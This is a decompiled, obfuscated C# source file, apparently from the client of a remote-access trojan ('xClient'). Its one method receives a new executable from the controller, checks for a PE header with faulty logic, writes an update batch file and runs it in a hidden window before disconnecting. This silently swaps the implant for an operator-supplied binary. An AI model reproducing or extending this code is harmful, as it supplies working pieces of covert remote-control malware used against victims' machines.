using System;
using System.Diagnostics;
using System.IO;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;

// Token: 0x02000011 RID: 17
public static class GClass15
{
	// Token: 0x0600007A RID: 122 RVA: 0x000061D8 File Offset: 0x000043D8
	public static void smethod_0(Client c, string newFilePath)
	{
		try
		{
			GClass4.smethod_2(newFilePath);
			byte[] array = File.ReadAllBytes(newFilePath);
			if (array[0] != 77 && array[1] != 90)
			{
				throw new Exception("no pe file");
			}
			string text = GClass4.smethod_4(newFilePath, GClass35.bool_0 && GClass35.bool_2);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create update batch file.");
			}
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = true,
				FileName = text
			};
			Process.Start(startInfo);
			GClass0.Disconnect = true;
			if (GClass35.bool_0 && GClass35.bool_1)
			{
				GClass16.smethod_2();
			}
			c.Disconnect();
		}
		catch (Exception ex)
		{
			GClass26.DeleteFile(newFilePath);
			new SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(c);
		}
	}
}
